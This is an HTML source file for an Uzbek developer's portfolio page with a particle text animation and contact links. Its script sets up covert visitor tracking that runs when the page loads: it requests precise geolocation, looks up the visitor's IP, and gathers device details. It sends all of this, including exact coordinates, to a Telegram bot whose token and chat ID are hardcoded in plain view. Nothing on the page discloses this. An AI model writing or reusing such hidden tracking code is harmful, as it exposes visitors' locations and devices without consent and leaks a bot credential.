<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>IsMoiL - iOS Liquid Glass</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
/* ================================== */
/* GLOBAL STYLES & CSS VARIABLES */
/* ================================== */
:root {
    --primary-bg: #0a0a0f;
    --glass-bg: rgba(255, 255, 255, 0.1);
    --glass-border: rgba(255, 255, 255, 0.18);
    --glass-blur: blur(15px);
    --text-primary: #ffffff;
    --text-secondary: #cccccc;
    --accent-color: #8c8cff;
    --button-radius: 50px;
    --card-radius: 25px;
    --transition-smooth: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    --shadow-light: 0 4px 15px rgba(0, 0, 0, 0.2);
    --shadow-medium: 0 8px 32px rgba(31, 38, 135, 0.37);
    --shadow-heavy: 0 8px 40px rgba(0, 0, 0, 0.7);
    --safe-area-top: env(safe-area-inset-top, 0px);
    --safe-area-bottom: env(safe-area-inset-bottom, 0px);
}

* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    margin: 0;
    padding: var(--safe-area-top) 0 var(--safe-area-bottom);
    background: var(--primary-bg);
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    width: 100vw;
    overflow-x: hidden;
    color: var(--text-primary);
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'SF Pro Display', Roboto, Helvetica, Arial, sans-serif;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
}

/* ================================== */
/* MAIN CONTAINER */
/* ================================== */
.container {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    width: 100%;
    max-width: 1200px;
    padding: 20px;
    gap: 30px;
}

/* ================================== */
/* CANVAS STYLES - RESPONSIVE */
/* ================================== */
.canvas-wrapper {
    position: relative;
    width: 100%;
    max-width: 1000px;
    aspect-ratio: 2/1; /* 1000x500 ning nisbati */
    margin: 0 auto;
}

#canvas {
    width: 100%;
    height: 100%;
    border: none;
    border-radius: var(--card-radius);
    background: rgba(255, 255, 255, 0.05);
    box-shadow: var(--shadow-medium);
    backdrop-filter: var(--glass-blur);
    -webkit-backdrop-filter: var(--glass-blur);
    border: 1px solid var(--glass-border);
    display: block;
}

/* ================================== */
/* LIQUID GLASS BUTTONS (ENHANCED) */
/* ================================== */
.liquid-glass-button {
    background: rgba(255, 255, 255, 0.15);
    backdrop-filter: blur(15px);
    -webkit-backdrop-filter: blur(15px);
    border: 1px solid rgba(255, 255, 255, 0.2);
    border-radius: var(--button-radius);
    color: white;
    padding: clamp(12px, 3vw, 16px) clamp(28px, 5vw, 35px);
    font-size: clamp(14px, 2vw, 16px);
    font-weight: 600;
    cursor: pointer;
    transition: var(--transition-smooth);
    box-shadow: var(--shadow-light);
    position: relative;
    overflow: hidden;
    letter-spacing: 0.5px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    min-width: 140px;
    min-height: 44px; /* Touch-friendly */
    user-select: none;
    -webkit-tap-highlight-color: transparent;
}

.liquid-glass-button:hover {
    background: rgba(255, 255, 255, 0.25);
    transform: translateY(-2px);
    box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3), 0 0 50px rgba(255, 255, 255, 0.1);
}

.liquid-glass-button:active {
    transform: translateY(1px);
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
    background: rgba(255, 255, 255, 0.1);
}

.liquid-glass-button i {
    font-size: 1.1em;
}

/* ================================== */
/* SOCIAL ICONS (RESPONSIVE) */
/* ================================== */
.social-icons {
    display: flex;
    gap: clamp(10px, 3vw, 20px);
    margin-bottom: 25px;
    flex-wrap: wrap;
    justify-content: center;
}

.social-link {
    display: flex;
    justify-content: center;
    align-items: center;
    width: clamp(45px, 10vw, 60px);
    height: clamp(45px, 10vw, 60px);
    border-radius: 50%;
    font-size: clamp(18px, 4vw, 24px);
    color: white;
    text-decoration: none;
    cursor: pointer;
    background: rgba(255, 255, 255, 0.15);
    box-shadow: 0 4px 30px rgba(0, 0, 0, 0.3);
    backdrop-filter: blur(12px);
    -webkit-backdrop-filter: blur(12px);
    border: 1px solid rgba(255, 255, 255, 0.2);
    transition: var(--transition-smooth);
    position: relative;
    overflow: hidden;
    -webkit-tap-highlight-color: transparent;
}

.social-link:hover {
    transform: scale(1.1) translateY(-2px);
    box-shadow: 0 8px 35px rgba(255, 255, 255, 0.15), 0 0 10px rgba(255, 255, 255, 0.1);
}

/* ================================== */
/* BUTTON GROUP */
/* ================================== */
.button-group {
    display: flex;
    justify-content: center;
    gap: clamp(15px, 4vw, 25px);
    margin-bottom: 25px;
    width: 100%;
    flex-wrap: wrap;
}

/* ================================== */
/* INFO TEXT */
/* ================================== */
.info-text {
    text-align: center;
    color: var(--text-secondary);
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 8px;
    width: 100%;
}

.info-text .name {
    font-size: clamp(14px, 3vw, 16px);
    font-weight: 500;
}

.info-text .copyright {
    font-size: clamp(10px, 2vw, 12px);
    opacity: 0.8;
}

/* ================================== */
/* LOADING STATE */
/* ================================== */
.loading {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: var(--primary-bg);
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 1000;
    transition: opacity 0.5s ease;
}

.loading.hidden {
    opacity: 0;
    pointer-events: none;
}

.loader {
    width: 50px;
    height: 50px;
    border: 3px solid transparent;
    border-top-color: var(--accent-color);
    border-radius: 50%;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

/* ================================== */
/* MEDIA QUERIES - RESPONSIVE DESIGN */
/* ================================== */

/* Tablet (768px dan kichik) */
@media (max-width: 768px) {
    .container {
        padding: 15px;
        gap: 20px;
    }
    
    .canvas-wrapper {
        max-width: 95vw;
        aspect-ratio: 16/9; /* Mobil uchun boshqa nisbat */
    }
    
    .button-group {
        flex-direction: row; /* Har doim qator bo'lib qolsin */
        gap: 12px;
    }
    
    .liquid-glass-button {
        min-width: 120px;
        padding: 12px 20px;
    }
}

/* Katta mobil (576px dan kichik) */
@media (max-width: 576px) {
    body {
        padding: 10px;
    }
    
    .container {
        gap: 15px;
        padding: 10px;
    }
    
    .canvas-wrapper {
        aspect-ratio: 4/3; /* Kichik ekranlar uchun */
    }
    
    .social-icons {
        gap: 12px;
    }
    
    .social-link {
        width: 50px;
        height: 50px;
    }
    
    .button-group {
        flex-direction: column;
        align-items: center;
        width: 100%;
        max-width: 300px;
        margin-left: auto;
        margin-right: auto;
    }
    
    .liquid-glass-button {
        width: 100%;
        max-width: 280px;
    }
}

/* Juda kichik ekranlar (400px dan kichik) */
@media (max-width: 400px) {
    .canvas-wrapper {
        aspect-ratio: 1/1; /* Kvadrat shaklida */
    }
    
    .social-link {
        width: 44px;
        height: 44px;
        font-size: 18px;
    }
    
    .info-text .name {
        font-size: 14px;
    }
}

/* Landscape (Yotiq holat) */
@media (max-height: 600px) and (orientation: landscape) {
    .container {
        flex-direction: row;
        flex-wrap: wrap;
        justify-content: space-around;
        padding: 10px;
    }
    
    .canvas-wrapper {
        width: 60%;
        max-width: 500px;
    }
    
    .info {
        width: 35%;
        min-width: 200px;
    }
    
    .social-icons {
        margin-bottom: 15px;
    }
}

/* Yuqori aniqlikdagi ekranlar */
@media (min-resolution: 192dpi) {
    .liquid-glass-button,
    .social-link {
        border-width: 0.5px;
    }
}

/* Qorong'i rejim */
@media (prefers-color-scheme: dark) {
    :root {
        --primary-bg: #050508;
        --glass-bg: rgba(255, 255, 255, 0.08);
    }
}

/* Yorqin rejim */
@media (prefers-color-scheme: light) {
    :root {
        --primary-bg: #f0f2f5;
        --glass-bg: rgba(255, 255, 255, 0.7);
        --glass-border: rgba(255, 255, 255, 0.3);
        --text-primary: #333333;
        --text-secondary: #666666;
        --shadow-medium: 0 8px 32px rgba(0, 0, 0, 0.1);
    }
    
    #canvas {
        background: rgba(255, 255, 255, 0.8);
    }
    
    .liquid-glass-button {
        background: rgba(255, 255, 255, 0.7);
        color: #333;
    }
    
    .social-link {
        background: rgba(255, 255, 255, 0.7);
    }
}

/* Animatsiyalar */
@keyframes fadeIn {
    from { opacity: 0; transform: translateY(20px); }
    to { opacity: 1; transform: translateY(0); }
}

.container > * {
    animation: fadeIn 0.6s ease-out forwards;
}

.container > *:nth-child(1) { animation-delay: 0.1s; }
.container > *:nth-child(2) { animation-delay: 0.2s; }
.container > *:nth-child(3) { animation-delay: 0.3s; }
.container > *:nth-child(4) { animation-delay: 0.4s; }

</style>
</head>
<body>

<!-- Loading Screen -->
<div class="loading" id="loading">
    <div class="loader"></div>
</div>

<div class="container">
    <div class="canvas-wrapper">
        <canvas id="canvas"></canvas>
    </div>

    <div class="social-icons">
        <a href="https://wa.me/qr/ESLNPMHYENPCJ1" target="_blank" class="social-link" data-platform="WhatsApp" title="WhatsApp">
            <i class="fab fa-whatsapp" style="color: #25D366;"></i>
        </a>
        <a href="https://t.me/IsMoiL2023" target="_blank" class="social-link" data-platform="Telegram" title="Telegram">
            <i class="fab fa-telegram" style="color: #0088cc;"></i>
        </a>
        <a href="https://www.instagram.com/is.moil833/" target="_blank" class="social-link" data-platform="Instagram" title="Instagram">
            <i class="fab fa-instagram" style="color: #E1306C;"></i>
        </a>
        <a href="tel:+998930413731" class="social-link" data-platform="Phone" title="Telefon">
            <i class="fas fa-phone"></i>
        </a>
        <a href="mailto:ismoilsheraliyev6@gmail.com" class="social-link" data-platform="Email" title="Email">
            <i class="fas fa-envelope"></i>
        </a>
    </div>

    <div class="button-group">
        <button class="liquid-glass-button" onclick="window.location.href='2.html'">
            <i class="fas fa-handshake"></i>
            <span>üí¨ Live chat...</span>
        </button>
        <button class="liquid-glass-button" onclick="window.location.href='3.html'">
            <i class="fas fa-info-circle"></i>
            <span>Batafsil</span>
        </button>
    </div>
    
    <div class="info-text">
        <div class="name">IsMoiL Sheraliyev¬ÆÔ∏è</div>
        <div class="copyright">Barcha huquqlar himoyalangan ¬© 2025</div>
    </div>
</div>

<script>
/* =======================
   RESPONSIVE CANVAS SETUP
==========================*/

const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const loading = document.getElementById("loading");

// Dastlabki o'lchamlarni belgilash
let canvasWidth = 1000;
let canvasHeight = 500;

// Canvas o'lchamini sozlash funksiyasi
function resizeCanvas() {
    const container = document.querySelector('.canvas-wrapper');
    const containerWidth = container.clientWidth;
    const containerHeight = container.clientHeight;
    
    // Ekran o'lchamiga qarab canvas o'lchamini moslashtirish
    if (window.innerWidth <= 768) {
        // Mobil uchun
        canvasWidth = Math.min(containerWidth, 800);
        canvasHeight = Math.min(containerHeight, canvasWidth * 0.75);
    } else if (window.innerWidth <= 1200) {
        // Planshet uchun
        canvasWidth = Math.min(containerWidth, 900);
        canvasHeight = canvasWidth * 0.5;
    } else {
        // Kompyuter uchun
        canvasWidth = Math.min(containerWidth, 1000);
        canvasHeight = canvasWidth * 0.5;
    }
    
    // Pixel ratio ni hisobga olish
    const pixelRatio = Math.min(window.devicePixelRatio || 1, 2);
    
    // Canvas o'lchamini o'rnatish
    canvas.style.width = `${canvasWidth}px`;
    canvas.style.height = `${canvasHeight}px`;
    canvas.width = canvasWidth * pixelRatio;
    canvas.height = canvasHeight * pixelRatio;
    
    // Contextni scale qilish
    ctx.scale(pixelRatio, pixelRatio);
    
    // Particle systemni yangilash
    updateParticleSystem();
}

// Particle systemni yangilash funksiyasi
function updateParticleSystem() {
    // Agar particles mavjud bo'lsa, ularni yangilash
    if (particles && particles.length > 0) {
        // Yangi o'lchamga mos keladigan qilib particle targetlarni qayta hisoblash
        // Bu soddalashtirilgan versiya, asl logikangizga moslashtirishingiz mumkin
        console.log("Canvas resized to:", canvasWidth, "x", canvasHeight);
    }
}

// Dastlabki yuklash
window.addEventListener('load', () => {
    resizeCanvas();
    setTimeout(() => {
        loading.classList.add('hidden');
        nextWord(words[0]);
        animate();
        sendVisitorInfo(); // Telegram bot funksiyasi
    }, 1000);
});

// Oynani o'lchaganda canvasni qayta sozlash
window.addEventListener('resize', () => {
    resizeCanvas();
});

// Ekran aylantirganda
window.addEventListener('orientationchange', () => {
    setTimeout(resizeCanvas, 100);
});

/* =======================
   QOLGAN KODLAR (O'ZGARMADI)
   Particle Logic, Telegram Bot, va boshqa funksiyalar
==========================*/

class Particle {
    constructor() {
        this.pos = { x: 0, y: 0 }
        this.vel = { x: 0, y: 0 }
        this.acc = { x: 0, y: 0 }
        this.target = { x: 0, y: 0 }
        this.closeEnoughTarget = 100
        this.maxSpeed = 1.0
        this.maxForce = 0.1
        this.particleSize = 10
        this.isKilled = false
        this.startColor = { r: 0, g: 0, b: 0 }
        this.targetColor = { r: 0, g: 0, b: 0 }
        this.colorWeight = 0
        this.colorBlendRate = 0.01
    }

    move() {
        let proximityMult = 1
        const dx = this.pos.x - this.target.x
        const dy = this.pos.y - this.target.y
        const dist = Math.sqrt(dx * dx + dy * dy)

        if (dist < this.closeEnoughTarget) {
            proximityMult = dist / this.closeEnoughTarget
        }

        const steerTo = {
            x: (this.target.x - this.pos.x),
            y: (this.target.y - this.pos.y)
        }
        const mag = Math.sqrt(steerTo.x ** 2 + steerTo.y ** 2)

        if (mag > 0) {
            steerTo.x = (steerTo.x / mag) * this.maxSpeed * proximityMult
            steerTo.y = (steerTo.y / mag) * this.maxSpeed * proximityMult
        }

        const steer = {
            x: steerTo.x - this.vel.x,
            y: steerTo.y - this.vel.y
        }

        const steerMag = Math.sqrt(steer.x ** 2 + steer.y ** 2)
        if (steerMag > 0) {
            steer.x = (steer.x / steerMag) * this.maxForce
            steer.y = (steer.y / steerMag) * this.maxForce
        }

        this.acc.x += steer.x
        this.acc.y += steer.y

        this.vel.x += this.acc.x
        this.vel.y += this.acc.y
        this.pos.x += this.vel.x
        this.pos.y += this.vel.y

        this.acc.x = 0
        this.acc.y = 0
    }

    draw(ctx) {
        if (this.colorWeight < 1.0) {
            this.colorWeight = Math.min(this.colorWeight + this.colorBlendRate, 1.0)
        }

        const c = {
            r: Math.round(this.startColor.r + (this.targetColor.r - this.startColor.r) * this.colorWeight),
            g: Math.round(this.startColor.g + (this.targetColor.g - this.startColor.g) * this.colorWeight),
            b: Math.round(this.startColor.b + (this.targetColor.b - this.startColor.b) * this.colorWeight),
        }

        ctx.fillStyle = `rgb(${c.r}, ${c.g}, ${c.b})`
        ctx.fillRect(this.pos.x, this.pos.y, 2, 2)
    }

    kill(width, height) {
        if (!this.isKilled) {
            const rp = generateRandomPos(width / 2, height / 2, (width + height) / 2)
            this.target.x = rp.x
            this.target.y = rp.y

            this.startColor = {
                r: this.startColor.r + (this.targetColor.r - this.startColor.r) * this.colorWeight,
                g: this.startColor.g + (this.targetColor.g - this.startColor.g) * this.colorWeight,
                b: this.startColor.b + (this.targetColor.b - this.startColor.b) * this.colorWeight,
            }

            this.targetColor = { r: 0, g: 0, b: 0 }
            this.colorWeight = 0
            this.isKilled = true
        }
    }
}

function generateRandomPos(x, y, mag) {
    const rx = Math.random() * canvasWidth
    const ry = Math.random() * canvasHeight

    let dx = rx - x
    let dy = ry - y
    const m = Math.sqrt(dx * dx + dy * dy)

    if (m > 0) {
        dx = (dx / m) * mag
        dy = (dy / m) * mag
    }

    return { x: x + dx, y: y + dy }
}

const particles = []
const pixelSteps = 6
let wordIndex = 0
let frameCount = 0

const words = ["Salom", "IsMoiL", "Sheraliyev", "Men", "Flutter", "Dasturchisiman", "G'oyalarni" , "Web", "iOS", "Android", "Dasturlarni", "Yarataman", "Bog'lanish", "Uchun", "Tugmani ‚¨á", "Bosing"]

const mouse = { x: 0, y: 0, pressed: false, right: false }

function nextWord(word) {
    const off = document.createElement("canvas")
    off.width = canvasWidth
    off.height = canvasHeight
    const offCtx = off.getContext("2d")

    offCtx.fillStyle = "white"
    // Font o'lchamini responsive qilish
    const fontSize = Math.min(canvasHeight * 0.2, canvasWidth * 0.1);
    offCtx.font = `bold ${fontSize}px Arial`
    offCtx.textAlign = "center"
    offCtx.textBaseline = "middle"
    offCtx.fillText(word, canvasWidth / 2, canvasHeight / 2)

    const img = offCtx.getImageData(0, 0, canvasWidth, canvasHeight)
    const px = img.data

    const newColor = {
        r: Math.random() * 255,
        g: Math.random() * 255,
        b: Math.random() * 255
    }

    let pIndex = 0
    const coords = []

    for (let i = 0; i < px.length; i += pixelSteps * 4) {
        coords.push(i)
    }

    coords.sort(() => Math.random() - 0.5)

    for (const idx of coords) {
        if (px[idx + 3] > 0) {
            const x = (idx / 4) % canvasWidth
            const y = Math.floor(idx / 4 / canvasWidth)

            let p
            if (pIndex < particles.length) {
                p = particles[pIndex]
                p.isKilled = false
            } else {
                p = new Particle()
                const r = generateRandomPos(canvasWidth / 2, canvasHeight / 2, (canvasWidth + canvasHeight) / 2)
                p.pos.x = r.x
                p.pos.y = r.y
                p.maxSpeed = Math.random() * 6 + 4
                p.maxForce = p.maxSpeed * 0.05
                p.particleSize = Math.random() * 6 + 6
                p.colorBlendRate = Math.random() * 0.027 + 0.003
                particles.push(p)
            }

            p.startColor = {
                r: p.startColor.r + (p.targetColor.r - p.startColor.r) * p.colorWeight,
                g: p.startColor.g + (p.targetColor.g - p.startColor.g) * p.colorWeight,
                b: p.startColor.b + (p.targetColor.b - p.startColor.b) * p.colorWeight
            }

            p.targetColor = newColor
            p.colorWeight = 0

            p.target.x = x
            p.target.y = y

            pIndex++
        }
    }

    for (let i = pIndex; i < particles.length; i++) {
        particles[i].kill(canvasWidth, canvasHeight)
    }
}

function animate() {
    ctx.fillStyle = "rgba(0,0,0,0.1)"
    ctx.fillRect(0, 0, canvasWidth, canvasHeight)

    for (let i = particles.length - 1; i >= 0; i--) {
        const p = particles[i]
        p.move()
        p.draw(ctx)

        if (p.isKilled) {
            if (p.pos.x < 0 || p.pos.x > canvasWidth || p.pos.y < 0 || p.pos.y > canvasHeight) {
                particles.splice(i, 1)
            }
        }
    }

    if (mouse.pressed && mouse.right) {
        particles.forEach(p => {
            const dx = p.pos.x - mouse.x
            const dy = p.pos.y - mouse.y
            const dist = Math.sqrt(dx * dx + dy * dy)
            if (dist < 50) p.kill(canvasWidth, canvasHeight)
        })
    }

    frameCount++
    if (frameCount % 240 === 0) {
        wordIndex = (wordIndex + 1) % words.length
        nextWord(words[wordIndex])
    }

    requestAnimationFrame(animate)
}

// Mouse events
canvas.addEventListener("mousedown", e => {
    mouse.pressed = true
    mouse.right = e.button === 2
    const r = canvas.getBoundingClientRect()
    mouse.x = (e.clientX - r.left) * (canvasWidth / r.width)
    mouse.y = (e.clientY - r.top) * (canvasHeight / r.height)
})

canvas.addEventListener("mouseup", () => {
    mouse.pressed = false
    mouse.right = false
})

canvas.addEventListener("mousemove", e => {
    const r = canvas.getBoundingClientRect()
    mouse.x = (e.clientX - r.left) * (canvasWidth / r.width)
    mouse.y = (e.clientY - r.top) * (canvasHeight / r.height)
})

canvas.addEventListener("contextmenu", e => e.preventDefault())

// Touch events
let pressTimer;
canvas.addEventListener("touchstart", e => {
    e.preventDefault();
    const r = canvas.getBoundingClientRect()
    const touch = e.touches[0];
    mouse.x = (touch.clientX - r.left) * (canvasWidth / r.width)
    mouse.y = (touch.clientY - r.top) * (canvasHeight / r.height)
    mouse.pressed = true
    
    pressTimer = setTimeout(() => {
        mouse.right = true;
    }, 500);
}, { passive: false });

canvas.addEventListener("touchend", () => {
    clearTimeout(pressTimer);
    mouse.pressed = false
    mouse.right = false
});

canvas.addEventListener("touchmove", e => {
    if (e.touches.length > 0) {
        const r = canvas.getBoundingClientRect()
        const touch = e.touches[0];
        mouse.x = (touch.clientX - r.left) * (canvasWidth / r.width)
        mouse.y = (touch.clientY - r.top) * (canvasHeight / r.height)
    }
}, { passive: true });

/* ==========================================
   TELEGRAM BOT INTEGRATSIYASI (Joylashuv bilan)
============================================= */

const BOT_TOKEN = '6592066300:AAED-lf6dpiRQy_k98s24dfR_1l2iMjms4U'; 
const CHAT_ID = '5641197226'; 

function getGeolocation() {
    return new Promise((resolve) => {
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        status: 'OK',
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    });
                },
                (error) => {
                    let errorMessage = 'Ruxsat berilmadi/Xatolik';
                    if (error.code === error.PERMISSION_DENIED) {
                        errorMessage = "Foydalanuvchi Geolocation so'rovini rad etdi.";
                    }
                    resolve({ status: 'ERROR', message: errorMessage });
                },
                {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                }
            );
        } else {
            resolve({ status: 'ERROR', message: 'Geolocation brauzer tomonidan quvvatlanmaydi.' });
        }
    });
}

async function sendVisitorInfo() {
    let geoLoc = { status: 'ERROR', message: 'Haqiqiy koordinatalar yo\'q' };
    
    geoLoc = await getGeolocation();

    try {
        const response = await fetch('https://ipapi.co/json/');
        const geoData = await response.json();
        const ip = geoData.ip || 'Aniqlanmadi';
        
        const name = "Sayt Mehmoni (Liquid Glass)";
        const userAgent = navigator.userAgent;
        let selectedPlatform = "Desktop/Web";
        
        // Qurilma turini aniqlash
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
        const isTablet = /iPad|Tablet|Silk/i.test(userAgent);
        
        if (isMobile) {
            selectedPlatform = window.innerWidth <= 576 ? "Mobile/Smartfon" : "Tablet/Planshet";
        }
        
        // Ekran o'lchami
        const screenSize = `${window.innerWidth}x${window.innerHeight}`;
        const deviceScreen = `${window.screen.width}x${window.screen.height}`;
        
        const timeString = new Date().toLocaleString('uz-UZ', { timeZone: 'Asia/Tashkent' });
        
        let message = `üéØ **Yangi Vizitka Qo'shildi** (Responsive Design)\n\n`;
        message += `üë§ **Foydalanuvchi Ma'lumotlari:**\n`;
        message += `   ‚Ä¢ Ism: ${name}\n`;
        message += `   ‚Ä¢ Platforma: ${selectedPlatform}\n`;
        message += `   ‚Ä¢ Ekran: ${screenSize} (Device: ${deviceScreen})\n`;
        message += `   ‚Ä¢ Vaqt: ${timeString}\n\n`;
        
        message += `üìç **Lokatsiya Ma'lumotlari:**\n`;
        message += `   ‚Ä¢ IP Manzil: ${ip}\n`;
        message += `   ‚Ä¢ Taxminiy Joylashuv: ${geoData.city || 'Noma\'lum'}, ${geoData.region || 'Noma\'lum'}, ${geoData.country_name || 'Noma\'lum'}\n`;
        
        if (geoLoc.status === 'OK') {
            message += `   ‚Ä¢ üìç **Aniq Geolokatsiya:**\n`;
            message += `     - Kenglik: ${geoLoc.latitude}\n`;
            message += `     - Uzunlik: ${geoLoc.longitude}\n`;
            message += `     - [Google Maps'da ko'rish](https://maps.google.com/?q=${geoLoc.latitude},${geoLoc.longitude})\n`;
        } else {
            message += `   ‚Ä¢ üìç **Aniq Geolokatsiya:** ${geoLoc.message}\n`;
        }
        
        message += `\nüíª **Qurilma Ma'lumotlari:**\n`;
        message += `   ‚Ä¢ Brauzer: ${navigator.userAgent.substring(0, 100)}...\n`;
        message += `   ‚Ä¢ Til: ${navigator.language || 'Noma\'lum'}\n`;
        message += `   ‚Ä¢ Responsive: ${window.innerWidth <= 768 ? 'Mobile View' : 'Desktop View'}\n`;
        
        if (BOT_TOKEN && CHAT_ID) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            
            if (geoLoc.status === 'OK') {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        latitude: geoLoc.latitude,
                        longitude: geoLoc.longitude
                    })
                });
            }
            
        } else {
            console.warn("Telegram BOT Token yoki CHAT ID kiritilmagan!");
        }
        
    } catch (error) {
        console.error("Ma'lumot yuborishda xatolik:", error);
    }
}

// Performance monitoring
let fps = 0;
let lastFrameTime = performance.now();

function updateFPS() {
    const now = performance.now();
    const delta = now - lastFrameTime;
    lastFrameTime = now;
    fps = Math.round(1000 / delta);
    
    // Agar juda sekin bo'lsa, optimizatsiya
    if (fps < 30 && particles.length > 1000) {
        console.log("Performance warning: Low FPS");
    }
}

// Optimized animation loop
function optimizedAnimate() {
    updateFPS();
    animate();
}

</script>

</body>
</html>
